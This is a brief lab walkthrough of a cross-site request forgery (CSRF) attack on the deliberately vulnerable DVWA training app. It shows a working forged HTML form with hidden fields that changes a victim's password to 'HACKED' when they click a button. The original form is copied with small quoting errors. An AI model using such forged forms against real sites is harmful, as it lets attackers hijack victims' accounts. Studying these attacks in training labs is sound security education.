1. Copy source file code in DVWA CSRF low.
2. Open Burp and set up Burp to " Intercept is on " mode.
3. Copy GET request Burp catch.

Details about step 3 :

GET code might look like this
```
<form action="#" method="GET">

New password:<br />

<input type="password" AUTOCOMPLETE="off" name="password_new'><br />

Confirm new password:<br />

<Input type="password" AUTOCOMPLETE="off" name="password_conf><br />

<br />

<input type="submit" value="Change" name="Change"></form>
```
Now try to change that to something like this
```
<form action="http://localhost/DVWA-master/vulnerabilities/csrf/?" method="GET">

<h1>Click Here</h1>

<input type="hidden" AUTOCOMPLETE="off" name="password_new" value="HACKED">

<input type="hidden" AUTOCOMPLETE="off" name="password_conf" value="HACKED">

<input type="submit" value="Change" name="Change"></form>
```
By altering code, an attack has been create.

When target user click the " Click Here ", a request will be sent to change user's user name and password. It is able to perform by DVWA is on source code. There is no protection against CSRF, such as Anti-CSRF token.